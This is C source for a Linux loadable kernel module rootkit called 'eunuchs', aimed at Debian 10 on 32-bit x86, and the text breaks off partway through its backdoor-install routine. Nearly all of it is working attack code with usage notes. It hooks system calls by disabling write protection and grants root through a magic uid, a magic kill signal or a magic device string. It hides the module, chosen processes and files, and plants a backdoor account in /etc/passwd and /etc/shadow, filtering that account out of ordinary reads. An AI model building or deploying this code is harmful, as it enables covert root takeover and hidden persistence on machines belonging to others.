/**
 * Targets Debian 10, x86-32bit
 * Kernel 4.19.67-2+deb10u1
 *
 * Kernel sources referenced via
 * https://elixir.bootlin.com/linux/v4.19.67/source/
 *
 * Linux Kernel Module Programming Guide reference
 * https://www.tldp.org/LDP/lkmpg/2.6/lkmpg.pdf
 *
 * Requirements to build:
 *  `sudo apt-get install build-essential linux-headers-($uname -r)`
 *  As root...
 *      1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
 *      2. execute `update-grub`
 *      3. reboot
 *      4. `grep sys_call_table /boot/System.map-$(uname -r)` to
 *         find the address of the system call table and change the value of
 *         sct below
 *
 * To load the module:
 *  `sudo insmod eunuchs.ko`
 *
 * To unload the module:
 *  `sudo rmmod eunuchs`
 *  NB: The LKM must NOT be hidden in order to remove it.
 *      `echo lemmesee > /dev/.eunuchs` to show the module in the loaded module
 *      list, so that it may be removed.
 *
 * Credential elevation... (3 ways)
 * (1) via setuid intercept:
 *  In your desired program, call `setuid(EUNUCHS_MAGIC_UID)`. Any other target uid will
 *  function as usual, but this particular target uid will elevate to 0. By
 *  default, this value is 0xdeadc0de.
 *  See the program in tools/icanhazshell.c for proof of concept.
 *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
 *
 * (2) via kill command:
 *  If the user sends the magic signal (#defined by EUNUCHS_MAGIC_SIGNAL) to any
 *  process, that user will be elevated to root. Note that your shell *may* have
 *  a built-in kill command, so use the fully qualified path to the binary to
 *  execute this (eg, `/usr/bin/kill`)
 *
 * (3) via char device:
 *  If the user writes `icanhazr00t?` (NB: you may need to properly escape this
 *  string when echo'ing it), that user will be elevated to root.
 *
 * All other interaction with this module is done by writing to /dev/.eunuchs.
 * Commands:
 *  ohaiplzshowallhiding            - shows all entries in the hidden lists (DEBUG ONLY)
 *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
 *                                    remove the LKM until after you make it
 *                                    visible again)
 *  lemmesee                        - show the LKM in lsmod
 *  icanhazr00t?                    - elevates the user to root credentials
 *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
 *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
 *  ohaiplzhidefile [ext]           - hide all files ending in [ext]
 *  ohaiplzshowfile [ext]           - show all files ending in [ext]
 **/

////////////////////////////////////////////////////////////////////////////////
// THESE VALUES CAN BE CHANGED AS DESIRED

static unsigned long *sct = 0xc167b180;

/* for our char char device */
#define EUNUCHS_DEVICE_NAME ".eunuchs" /* change the name of the device here if desired */
#define EUNUCHS_CLASS_NAME ".eunuchs"

/* files that end in this will be hidden by default */
#define EUNUCHS_DEFAULT_HIDE_EXT ".eunuchs"

/* magic number for our setuid intercept */
#define EUNUCHS_MAGIC_UID 0xdeadc0de

/* magic number for our kill switch to elevate credentials */
#define EUNUCHS_MAGIC_SIGNAL 42 /* 42 - the answer to all of life's mysteries */

/**
 * what lines should we be injecting into /etc/passwd and /etc/shadow?
 * Default account that is injected is
 *  user -> me0wza
 *  pass -> w0wza
 **/
#define EUNUCHS_PASSWD_MOD "\nme0wza:x:31337:31337::/:/bin/sh\n"
#define EUNUCHS_SHADOW_MOD "\nme0wza:$6$ndHcTwCTVHYKicfm$rucI7fX275L7zHK/wQ.olS8tt3xFvhFCut0SdVAQn2Rt9kHTi4K8ftjvImMM.9w2CKW6HgDw/lzzdoh0Vt4d10:18227:0:99999:7:::\n"

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/namei.h>        // for kern_path
#include <linux/slab.h>         // kmalloc
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/device.h>       // device creation
#include <linux/cdev.h>         // character device
#include <linux/types.h>
#include <linux/fs.h>           // filesystem
#include <linux/proc_fs.h>      // for proc vfs
#include <linux/string.h>       // string manipulation
#include <linux/dirent.h>       // directory entries
#include <linux/list.h>         // linked lists
#include <linux/cred.h>         // credentials, for setuid
#include <linux/fdtable.h>      // for fcheck_files
#include <linux/sched.h>        // for task_struct.. for current macro

/* set this to [1 to enable][0 to disable] debug messages/functions */
#define DEBUG 0
#define debug(fmt, ...) \
    if(DEBUG) \
    { \
        printk("[eunuchs] [%s] " fmt, __func__, ##__VA_ARGS__); \
    }

static int eunuchs_init(void);
static void eunuchs_exit(void);
static int eunuchs_hooks_install(void);
static void eunuchs_hooks_remove(void);
static void cr0_enable_write(void);
static void cr0_disable_write(void);
static int eunuchs_dev_init(void);
static int eunuchs_dev_remove(void);
static int hide_proc_by_pid(char *);
static int show_proc_by_pid(char *);
static int eunuchs_lists_show_all(void);
static int eunuchs_hide_lkm(void);
static int eunuchs_show_lkm(void);
static int show_file_by_ext(char *);
static int hide_file_by_ext(char *);
static int eunuchs_elevate_creds(void);
static int eunuchs_file_ext_list_contains(char *s);

/**
 * We use the kernel's linked list implementation to track which pids and files
 * to hide.
 **/
typedef struct eunuchs_proc_hide_by_pid
{
    struct list_head list;
    char *pid;
} eunuchs_proc_hide_by_pid;
LIST_HEAD(proc_hide_by_pid_list);

typedef struct eunuchs_file_hide_by_ext
{
    struct list_head list;
    char *ext;
} eunuchs_file_hide_by_ext;
LIST_HEAD(file_hide_by_ext_list);

////////////////////////////////////////////////////////////////////////////////
// CHAR DEVICE

static struct class *eunuchs_cl;    // for class descriptor
static int eunuchs_dev_maj_number;  // major number for device

static int eunuchs_char_open(struct inode *i, struct file *f)
{
    return 0;
}

static int eunuchs_char_release(struct inode *i, struct file *f)
{
    return 0;
}

static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
    debug("read() got [%s] [%d bytes]\n", buf, len);
    return 0;
}

/**
 * eunuchs_char_write(struct file*, char *, size_t, loff_t *) -
 *
 * This is our handler for writing to /dev/eunuchs. This can be written to by
 * `echo 'command' > /dev/eunuchs`.
 **/
static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
{
    char a[len+1];
    size_t i;

    /* only care about things up to newline (or null term) */
    for(i = 0; i < len; i++)
    {
        if(buf[i] != '\n')
            a[i] = buf[i];
        else
            break;
    }
    a[i] = '\0';

    debug("write() got [%s] [%d bytes]\n", a, len);

    if(strncmp(a, "kthxbye", 7) == 0)
    {
        eunuchs_hide_lkm();
    }
    else if(strncmp(a, "lemmesee", 8) == 0)
    {
        eunuchs_show_lkm();
    }
    else if(strncmp(a, "ohaiplzhideproc ", 16) == 0)
    {
        char *p = a + 16;
        debug("hiding pid %s\n", p);
        hide_proc_by_pid(p);
    }
    else if(strncmp(a, "ohaiplzshowproc ", 15) == 0)
    {
        char *p = a + 16;
        debug("showing pid %s\n", p);
        show_proc_by_pid(p);
    }
    else if(strncmp(a, "ohaiplzhidefile ", 15) == 0)
    {
        char *p = a + 16;
        debug("want to hide file\n");
        hide_file_by_ext(p);
    }
    else if(strncmp(a, "ohaiplzshowfile ", 15) == 0)
    {
        char *p = a + 16;
        debug("want to show file\n");
        show_file_by_ext(p);
    }
    else if(strncmp(a, "icanhazr00t?", 12) == 0)
    {
        debug("want to elevate creds\n");
        eunuchs_elevate_creds();
    }
#ifdef DEBUG
    else if(strncmp(a, "ohaiplzshowallhiding", 20) == 0)
    {
        eunuchs_lists_show_all();
    }
#endif
    return len;
}

static struct file_operations eunuchs_fops =
{
    .owner = THIS_MODULE,
    .read = eunuchs_char_read,
    .write = eunuchs_char_write,
    .open = eunuchs_char_open,
    .release = eunuchs_char_release
};

/**
 * eunuchs_devnode(struct device*, umode_t*) -
 *  Changes the permissions on the char device to be 0666
 **/
static char* eunuchs_devnode(struct device *dev, umode_t *mode)
{
    if(mode)
        *mode = 0666;
    return NULL;
}

/**
 * eunuchs_dev_init() -
 *  Creates a char device so that we can communicate with the lkm from userland
 **/
static int eunuchs_dev_init()
{
    if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
    {
        debug("register_chrdev() failed\n");
        return -1;
    }

    if((eunuchs_cl = class_create(THIS_MODULE, EUNUCHS_CLASS_NAME)) == NULL)
    {
        debug("class_create() failed\n");
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }
    eunuchs_cl->devnode = eunuchs_devnode;

    if(device_create(eunuchs_cl, NULL, MKDEV(eunuchs_dev_maj_number, 0), NULL, EUNUCHS_DEVICE_NAME) == NULL)
    {
        debug("device_create() failed\n");
        class_destroy(eunuchs_cl);
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }

    debug("device created\n");
    return 0;
}

/**
 * enuchs_dev_remove() -
 *  Removes the char device
 **/
static int eunuchs_dev_remove()
{
    device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
    class_destroy(eunuchs_cl);
    unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
    debug("device removed\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
/* Pointers to save the original functions to. */
static typeof(sys_read) *orig_read;
static typeof(sys_getdents) *orig_getdents;
static typeof(sys_getdents64) *orig_getdents64;
static typeof(sys_setuid) *orig_setuid;
static typeof(sys_kill) *orig_kill;
static typeof(sys_fstat64) *orig_fstat64;
static typeof(sys_lstat64) *orig_lstat64;
static typeof(sys_stat64) *orig_stat64;

/**
 * eunuchs_elevate_uid() -
 *  Elevates the credentials of a process.
 **/
static int eunuchs_elevate_creds(void)
{
    struct cred *creds = NULL;
    debug("setting uid to 0\n");

    creds = prepare_creds();
    if(creds == NULL)
        return -1;

    creds->uid = (kuid_t){ 0 };
    creds->gid = (kgid_t){ 0 };
    creds->suid = (kuid_t){ 0 };
    creds->sgid = (kgid_t){ 0 };
    creds->euid = (kuid_t){ 0 };
    creds->egid = (kgid_t){ 0 };
    creds->fsuid = (kuid_t){ 0 };
    creds->fsgid = (kgid_t){ 0 };

    return commit_creds(creds);
}

/**
 * setuid() handler.
 *  If the provided target uid is our superdupermagical uid, set uid to 0.
 *
 *  see https://www.kernel.org/doc/Documentation/security/credentials.txt
 **/
static asmlinkage long eunuchs_setuid(uid_t uid)
{

    debug("setuid intercepted\n");

    if(uid == EUNUCHS_MAGIC_UID)
        return eunuchs_elevate_creds();

    return orig_setuid(uid);
}

/**
 * read() handler -
 *
 * Here, we check to see if we're trying to read either /etc/passwd or
 * /etc/shadow. If a process is not trying to read either one of these, just use
 * the original read function, since we don't need to do anything.
 *
 * However, if a process *is* attempting to read one of these, we then need to
 * determine whether it's a user trying to read the files, or a login-type process.
 *
 * If it's a process, we then need to see if it's a login-type process (login,
 * systemd-logind, gdm, etc) which *SHOULD* have visibility to our account (or
 * else having that account is useless), or some other command (vim, more, less,
 * cat, nano, etc). We can determine this by noting that the latter type of
 * commands have a parent process which is (probably) a shell or terminal, while
 * the former should be daemons which have a parent process of systemd (init).
 *
 * Due to forking and tom-foolery, we count how many parent processes we have
 * and set a limit there. We set our `amount of parents` threshold to be
 * a maximum of 2 in order to not strip out contents.
 *
 * If we figure that, for example, ssh spawns a child, which in turn spawns a
 * child, the resulting process hierarchy looks like
 *    systemd -> sshd -> sshd -> sshd
 * pstree shows that the last two belong to the same process group, so we get
 * the group leader, and keep going to each group leader's parent, until we hit
 * pid 1. If the amount of traversals here is less than our threshold, we do not
 * strip out the contents, so that we may login to ssh.
 *
 * Conversely, most users attemping to read the file by
 * more/less/cat/vim/nano/etc will have a process hierarchy that looks like
 *    systemd -> systemd-user -> gnome-terminal -> zsh -> more
 * all of which belong to different process groups. Since the amount of
 * traversals to get to init (pid 1) here is higher than we set our threshold,
 * we should strip this out so that it's not visible.
 *
 * This was tested via login with gdm (which works *in theory*, but fails *in
 * practice* due to the backdoor user's homedir & the permissions therein. You
 * know it works because it doesn't tell you "wrong password", but starts trying
 * to launch all the gnome nonsense... But who remotes into a box via gdm,
 * anyway?), ssh (works fine), and plain ol' login (works fine).
 * These were tested under both runlevels 5 (graphical) and 3 (console).
 **/
static asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
{
    struct file *f = NULL;
    struct path *p = NULL;
    char *tmp = NULL, *path = NULL;
    char *snicklefritz = NULL;

    f = fcheck_files(current->files, fd);
    if(!f)
    {
        debug("fcheck_files failed\n");
        return -ENOENT;
    }

    p = &f->f_path;
    path_get(p);
    tmp = (char *)__get_free_page(GFP_KERNEL);
    if(!tmp)
    {
        debug("__get_free_page failed\n");
        path_put(p);
        return -ENOMEM;
    }

    path = d_path(p, tmp, PAGE_SIZE);
    path_put(p);
    if(IS_ERR(path))
    {
        free_page((unsigned long)tmp);
        return PTR_ERR(path);
    }

    if(!strcmp(path, "/etc/passwd"))
    {
        debug("trying to read passwd\n");
        snicklefritz = kmalloc(sizeof(char) * (strlen(EUNUCHS_PASSWD_MOD) + 1), GFP_KERNEL);
        if(!snicklefritz)
        {
            debug("kmalloc failed\n");
            goto end;
        }
        strcpy(snicklefritz, EUNUCHS_PASSWD_MOD);
    }
    else if(!strcmp(path, "/etc/shadow"))
    {
        debug("trying to read shadow\n");
        snicklefritz = kmalloc(sizeof(char) * (strlen(EUNUCHS_SHADOW_MOD) + 1), GFP_KERNEL);
        if(!snicklefritz)
        {
            debug("kmalloc failed\n");
            goto end;
        }
        strcpy(snicklefritz, EUNUCHS_SHADOW_MOD);
    }

    if(snicklefritz)
    {
        struct task_struct *t = NULL;
        char *new_buf = NULL;
        int res = 0, depth = 0;

        /* is the parent process init? */
        debug("current->gl->pid %d\n"
              "current->gl->rp->pid %d\n"
              "current->gl->p->pid %d\n"
              "current->rp->pid %d\n"
              "current->p->pid %d\n",
              current->group_leader->pid,
              current->group_leader->real_parent->pid,
              current->group_leader->parent->pid,
              current->real_parent->pid,
              current->parent->pid);

        /* see how many deep from init we are.. if we're >= 3, strip */
        t = current;
        while(t->group_leader &&
              t->group_leader->real_parent &&
              t->group_leader->real_parent->pid != (pid_t)1)
        {
            depth++;
            t = t->group_leader->real_parent;
        }

        if(depth < 2)
        {
            /* we don't strip out stuff for init */
            debug("... not stripping, only %d deep in ps tree\n", depth);
            goto end;
        }

        debug("... we're %d deep in the ps tree.. strip it out\n", depth);

        /* parent process is NOT init, we need to remove stuff */
        /* read the file like usual, then strip out what we want */
        res = orig_read(fd, buf, count);

        /* is the backdoor account in the file contents? */
        if(strstr(buf, snicklefritz))
        {
            debug("... stripping backdoor account from read\n");

            new_buf = kmalloc(sizeof(char) * (res + 1), GFP_KERNEL);
            if(!new_buf)
            {
                debug("kmalloc failed\n");
                goto end;
            }

            copy_from_user(new_buf, buf, res);
            if(!new_buf)
            {
                debug("copy_from_user() failed\n");
                kfree(new_buf);
                goto end;
            }

            /* in case somehow there are multiple entries in the file */
            while(strstr(new_buf, snicklefritz))
            {
                char *mark = strstr(new_buf, snicklefritz),
                     *end = mark + strlen(snicklefritz);
                int remaining = strlen(end) + 1; // + 1 for null term
                memmove(mark, end, remaining);
                res -= strlen(snicklefritz);
            }

            copy_to_user(buf, new_buf, res);

            if(new_buf)
                kfree(new_buf);
        }

        if(snicklefritz)
            kfree(snicklefritz);
        if(tmp)
            free_page((unsigned long)tmp);

        return res;
    }

end:
    if(snicklefritz)
        kfree(snicklefritz);
    if(tmp)
        free_page((unsigned long)tmp);

    return orig_read(fd, buf, count);
}

/**
 * Define the linux_dirent structure for use with our getdents handler.
 **/
struct linux_dirent
{
    unsigned long       d_ino;
    unsigned long       d_off;
    unsigned short      d_reclen;
    char                d_name[];
};

/**
 * getdents() handler. Probably not needed. What calls this explicitly?
 * Strips entries out of `ls`.
 **/
static asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
{
    long res = orig_getdents(fd, fp, count);

    unsigned int offset = 0, new_len = 0;
    struct linux_dirent *cur = NULL;
    struct dirent *new_fp = NULL;

    new_fp = kmalloc(res, GFP_KERNEL);
    if(!new_fp)
    {
        debug("kmalloc failed\n");
        return res;
    }

    /* this loop goes over the entries given in fp. if one is found which
     * contains a suffix which we want to hide, we skip over it. otherwise, we
     * keep it in and pass it along to the user */
    while(offset < res)
    {
        char *fpp = (char *)fp + offset;
        cur = (struct linux_dirent *)fpp;
        if(!eunuchs_file_ext_list_contains(cur->d_name))
        {
            memcpy((void *)new_fp + new_len, cur, cur->d_reclen);
            new_len += cur->d_reclen;
        }

        offset += cur->d_reclen;
    }

    memcpy(fp, new_fp, new_len);
    res = new_len;

    if(new_fp)
        kfree(new_fp);

    return res;
    return orig_getdents(fd, fp, count);
}

/**
 * getdents64() handler. This is used for large filesystems, and seems to be
 * what ls uses. Strips entries out of `ls`.
 **/
static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
{
    long res = orig_getdents64(fd, fp, count);

    unsigned int offset = 0, new_len = 0;
    struct linux_dirent64 *cur = NULL;
    struct dirent *new_fp = NULL;

    new_fp = kmalloc(res, GFP_KERNEL);
    if(!new_fp)
    {
        debug("kmalloc failed\n");
        return res;
    }

    /* this loop goes over the entries given in fp. if one is found which
     * contains a suffix which we want to hide, we skip over it. otherwise, we
     * keep it in and pass it along to the user */
    while(offset < res)
    {
        char *fpp = (char *)fp + offset;
        cur = (struct linux_dirent64 *)fpp;
        if(!eunuchs_file_ext_list_contains(cur->d_name))
        {
            memcpy((void *)new_fp + new_len, cur, cur->d_reclen);
            new_len += cur->d_reclen;
        }

        offset += cur->d_reclen;
    }

    memcpy(fp, new_fp, new_len);
    res = new_len;

    if(new_fp)
        kfree(new_fp);

    return res;
}

/**
 * lstat64() handler. Should we hide the file from lstat calls?
 **/
static asmlinkage int eunuchs_lstat64(const char *filename, struct stat64 __user *statbuf)
{
    return eunuchs_file_ext_list_contains(filename) ?
        -ENOENT :
        orig_lstat64(filename, statbuf);
}

/**
 * stat64() handler. Should we hide the file from stat calls?
 **/
static asmlinkage int eunuchs_stat64(const char *filename, struct stat64 __user *statbuf)
{
    return eunuchs_file_ext_list_contains(filename) ?
        -ENOENT :
        orig_stat64(filename, statbuf);
}

/**
 * fstat64() handler(). This is so we can hide a particular file from fstat
 * commands.
 *
 * Getting the full path+filename from a file descriptor is done with code
 * adapted from
 * https://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module
 **/
static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *statbuf)
{
    char *path = NULL, *tmp = NULL;
    struct file *f = NULL;
    struct path *p = NULL;
    int hidden = 0;

    spin_lock(&current->files->file_lock);
    f = fcheck_files(current->files, fd);
    if(!f)
    {
        spin_unlock(&current->files->file_lock);
        return -ENOENT;
    }

    p = &f->f_path;
    path_get(p);
    spin_unlock(&current->files->file_lock);

    tmp = (char *)__get_free_page(GFP_KERNEL);
    if(!tmp)
    {
        path_put(p);
        return -ENOMEM;
    }

    path = d_path(p, tmp, PAGE_SIZE);
    path_put(p);

    if(IS_ERR(path))
    {
        free_page((unsigned long)tmp);
        return PTR_ERR(path);
    }

    hidden = eunuchs_file_ext_list_contains(path);
    if(hidden)
        debug("hiding file [%s]\n", path);

    free_page((unsigned long)tmp);

    return hidden ? -ENOENT : orig_fstat64(fd, statbuf);
}

/**
 * kill() handler. This is so that we can `kill -s [magic_signal_number] [pid]` to elevate
 * creds. Make sure you're using the kill executable, and not a built-in shell
 * command.
 **/
static asmlinkage long eunuchs_kill(pid_t pid, int sig)
{
    if(sig == EUNUCHS_MAGIC_SIGNAL)
    {
        debug("got magic signal\n");
        return eunuchs_elevate_creds();
    }

    return orig_kill(pid, sig);
}

////////////////////////////////////////////////////////////////////////////////
/* This is the original value of CR0 */
static unsigned original_cr0;

/**
 * cr0_enable_write() -
 *  Twiddles CR0 to enable writing to read-only memory
 **/
static void cr0_enable_write()
{
    unsigned cr0 = 0;
    debug("disabling page write protection\n");
    asm volatile("movl %%cr0, %%eax"
                 :"=a"(cr0));
    original_cr0 = cr0;
    cr0 &= 0xfffeffff;
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(cr0));
}

/**
 * cr0_disable_write() -
 *  Twiddles CR0 to disable writing to read-only memory
 **/
static void cr0_disable_write()
{
    debug("restoring write protection on cr0\n");
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(original_cr0));
}

////////////////////////////////////////////////////////////////////////////////
// FILE HIDING LISTS

/**
 * hide_file_by_ext(char *) -
 *  Hides all files that end in the supplied extension.
 **/
static int hide_file_by_ext(char *ext)
{
    eunuchs_file_hide_by_ext *f = NULL;
    debug("hiding files with extension [%s]\n", ext);

    f = kmalloc(sizeof(eunuchs_file_hide_by_ext), GFP_KERNEL);
    if(!f)
        return -1;

    f->ext = kmalloc(sizeof(char) * (strlen(ext) + 1), GFP_KERNEL);
    if(!f->ext)
        return -1;

    strncpy(f->ext, ext, strlen(ext) + 1);
    list_add(&f->list, &file_hide_by_ext_list);
    return 0;
}

/**
 * show_file_by_ext(char *) -
 *  Shows all files that end in the supplied extension.
 **/
static int show_file_by_ext(char *ext)
{
    eunuchs_file_hide_by_ext *show = NULL, *tmp = NULL;
    debug("showing files with extension [%s]\n", ext);

    list_for_each_entry_safe(show, tmp, &file_hide_by_ext_list, list)
    {
        if(strcmp(show->ext, ext) == 0)
        {
            list_del(&show->list);
            kfree(show->ext);
            kfree(show);
        }
    }
    return 0;
}

////////////////////////////////////////////////////////////////////////////////
// PROCESS HIDING
//
//   adapted from / inspired by
//   https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/

/**
 * hide_proc_by_pid(char *) -
 *  Hides a specified pid.
 **/
static int hide_proc_by_pid(char *pid)
{
    eunuchs_proc_hide_by_pid *hide = kmalloc(sizeof(eunuchs_proc_hide_by_pid), GFP_KERNEL);
    if(hide == NULL)
        return -1;
    hide->pid = kmalloc(sizeof(char) * (strlen(pid) + 1), GFP_KERNEL);
    strncpy(hide->pid, pid, strlen(pid) + 1);

    list_add(&hide->list, &proc_hide_by_pid_list);
    return 0;
}

/**
 * show_proc_by_pid(char *) -
 *  Shows a specified pid.
 **/
static int show_proc_by_pid(char *pid)
{
    eunuchs_proc_hide_by_pid *show = NULL, *tmp = NULL;
    list_for_each_entry_safe(show, tmp, &proc_hide_by_pid_list, list)
    {
        if(strcmp(show->pid, pid) == 0)
        {
            list_del(&show->list);
            kfree(show->pid);
            kfree(show);
        }
    }
    return 0;
}

static struct file_operations proc_fileops;
static struct file_operations *backup_proc_fileops;
static struct inode *proc_inode;
static struct path proc_p;
static struct dir_context *proc_backup_ctx;

/**
 * eunuchs_proc_filldir(struct dir_context *, const char *, int, loff_t,
 *                      uint64_t, unsigned int) -
 *  This evaluates whether or not we should strip out the current entry from the
 *  list returned to the user. If the pid of (proc_name) exists in our
 *  proc_hide_by_pid_list, we return 0. Otherwise, we allow the original
 *  function to do its thing.
 **/
static int eunuchs_proc_filldir(struct dir_context *d_ctx, const char *proc_name, int len, loff_t off, uint64_t inode, unsigned int d_type)
{
    /* does the process name exist in the list of things we should be hiding? */
    eunuchs_proc_hide_by_pid *p = NULL;
    list_for_each_entry(p, &proc_hide_by_pid_list, list)
    {
        if(strcmp(proc_name, p->pid) == 0)
        {
            debug("filtering %s out of results\n", proc_name);
            return 0;
        }
    }

    return proc_backup_ctx->actor(proc_backup_ctx, proc_name, len, off, inode, d_type);
}

/* a dir_context that contains our filldir function */
static struct dir_context eunuchs_proc_ctx =
{
    .actor = eunuchs_proc_filldir,
};

/**
 * eunuchs_proc_iterate_shared(struct file *, struct dir_context *) -
 *  This iterates over each entry in the directory, calling our filldir function
 **/
static int eunuchs_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int res = 0;
    eunuchs_proc_ctx.pos = ctx->pos;
    proc_backup_ctx = ctx;
    res = backup_proc_fileops->iterate_shared(file, &eunuchs_proc_ctx);
    ctx->pos = eunuchs_proc_ctx.pos;

    return res;
}

/**
 * process_hide_init() -
 *  Gets the /proc inode, backs up the original values for its file operations,
 *  and updates the file ops to use our versions instead (for iterating).
 **/
static int process_hide_init(void)
{
    debug("hijacking /proc vfs & file ops\n");

    if(kern_path("/proc", 0, &proc_p))
        return -1;

    /* get the inode & make a backup of the fileops */
    proc_inode = proc_p.dentry->d_inode;
    backup_proc_fileops = proc_inode->i_fop;

    /* modify the file ops to use our iterator instead */
    proc_fileops = *proc_inode->i_fop;
    proc_fileops.iterate_shared = eunuchs_proc_iterate_shared;
    proc_inode->i_fop = &proc_fileops;

    return 0;
}

/**
 * process_hide_remove() -
 *  Restores /proc to its original state.
 **/
static void process_hide_remove(void)
{
    debug("restoring /proc vfs & file ops\n");

    if(kern_path("/proc", 0, &proc_p))
        return;

    /* restore the proc vfs & file operations */
    proc_inode = proc_p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fileops;
}

////////////////////////////////////////////////////////////////////////////////
// LIST FUNCTIONS

#ifdef DEBUG
static int eunuchs_lists_show_all(void)
{
    eunuchs_proc_hide_by_pid *p = NULL;
    eunuchs_file_hide_by_ext *f = NULL;

    debug("Hide by pid list contains:\n");
    list_for_each_entry(p, &proc_hide_by_pid_list, list)
    {
        debug("[%s]\n", p->pid);
    }

    debug("Hide by file extension list contains:\n");
    list_for_each_entry(f, &file_hide_by_ext_list, list)
    {
        debug("[%s]\n", f->ext);
    }
}
#endif

/**
 * eunuchs_file_ext_list_contains(char *) -
 *  Returns 1 if the hide by file extension list contains the supplied string,
 *  0 otherwise.
 **/
static int eunuchs_file_ext_list_contains(char *s)
{
    eunuchs_file_hide_by_ext *f = NULL;
    size_t s_len = 0, ext_len = 0;
    if(s == NULL)
        return 0;

    s_len = strlen(s);
    list_for_each_entry(f, &file_hide_by_ext_list, list)
    {
        ext_len = strlen(f->ext);

        if(ext_len > s_len)
            continue;

        if(strncmp(s + s_len - ext_len, f->ext, ext_len) == 0)
            return 1;
    }
    return 0;
}

/**
 * eunuchs_lists_init() -
 *  Initializes our linked lists which control hide/show of certain things.
 **/
static int eunuchs_lists_init(void)
{
    debug("setting up lists\n");
    hide_file_by_ext(EUNUCHS_DEFAULT_HIDE_EXT);
    return 0;
}

/**
 * eunuchs_lists_free() -
 *  Frees all lists. Note that we have to use the _safe version of for_each, due
 *  to changing the structure of the list, to avoid null pointer exceptions.
 **/
static void eunuchs_lists_free(void)
{
    eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;
    eunuchs_file_hide_by_ext *fd = NULL, *fd2 = NULL;

    debug("freeing lists\n");

    /* free hide process by pid list */
    list_for_each_entry_safe(pd, pd2, &proc_hide_by_pid_list, list)
    {
        debug("removing %s from pid hiding list\n", pd->pid);
        list_del(&pd->list);
        kfree(pd);
    }

    /* free hide files by extension list */
    list_for_each_entry_safe(fd, fd2, &file_hide_by_ext_list, list)
    {
        debug("removing %s from file extension hiding list\n", fd->ext);
        list_del(&fd->list);
        kfree(fd->ext);
        kfree(fd);
    }
}

////////////////////////////////////////////////////////////////////////////////
// MAIN DRIVERS

/* list of all modules (what lsmod shows) */
static struct list_head *mod_list = NULL;

/**
 * eunuchs_install_backdoor() -
 *  Installs a backdoor account in /etc/passwd and /etc/shadow
 *
 *  File IO obnoxiousness assisted by
 *  https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
 **/
static int eunuchs_install_backdoor(void)
{
    mm_segment_t oldfs;
    struct file *f = NULL;
    __kernel_long_t size = 0;
    char *buf = NULL;
    int res = 0;
    unsigned long long pos = 0;
    struct kstat ks;

    oldfs = get_fs();
    set_fs(get_ds());

    /* work on /etc/passwd */
    vfs_stat("/etc/passwd", &ks);
    size = ks.size;
    debug("passwd %ld bytes\n", size);
    f = filp_open("/etc/passwd", O_RDWR, NULL);

    if(IS_ERR(f))
    {
        debug("failed to open /etc/passwd: %ld\n", PTR_ERR(f));
        res = (int)f;
        goto fail;
    }

    buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
    if(!buf)
    {
        debug("kmalloc failed\n");
        res = (int)buf;
        goto fail;
    }

    if(IS_ERR(res = vfs_read(f, buf, size, &pos)))
    {
        debug("vfs_read failed on passwd: %ld\n", PTR_ERR(res));
        goto fail;
    }

    /* does the file already contain the backdoor account? don't add it again */
    if(!strnstr(buf, EUNUCHS_PASSWD_MOD, size))
    {
        char *p = EUNUCHS_PASSWD_MOD;

        /* do this to avoid inserting a blank line */
        if(buf[size-1] == '\n')
            p++;

        if(IS_ERR(res = vfs_write(f, p, strlen(p), &pos)))
        {
            debug("vfs_write failed on passwd\n");
            goto fail;
        }
    }
    else
    {
        debug("passwd already contains backdoor\n");
    }

    kfree(buf);
    buf = NULL;
    filp_close(f, NULL);
    f = NULL;
    size = 0; res = 0; pos = 0;

    /* work on /etc/shadow */
    vfs_stat("/etc/shadow", &ks);
    size = ks.size;
    debug("shadow %ld bytes\n", size);

    if(IS_ERR(f = filp_open("/etc/shadow", O_RDWR, NULL)))
    {
        debug("failed to open /etc/shadow: %ld\n", PTR_ERR(f));
        res = (int)f;
        goto fail;
    }

    buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
    if(!buf)
    {
        debug("kmalloc failed\n");
        res = (int)buf;
        goto fail;
    }

    if(IS_ERR(res = vfs_read(f, buf, size, &pos)))
    {
        debug("kernel_read failed on shadow: %ld\n", PTR_ERR(res));
        goto fail;
    }

    /* does the file already contain the backdoor account? don't add it again */
    if(!strnstr(buf, EUNUCHS_SHADOW_MOD, size))
    {
        char *s = EUNUCHS_SHADOW_MOD;

        /* again, to avoid inserting a blank line in the file */
        if(buf[size-1] == '\n')
            s++;

        if(IS_ERR(res = vfs_write(f, s, strlen(s), &pos)))
        {
            goto fail;
        }
    }
    else
    {
        debug("shadow already contains backdoor\n");
    }

fail:
    if(buf)
        kfree(buf);
    if(f > 0)
        filp_close(f, NULL);

    set_fs(oldfs);
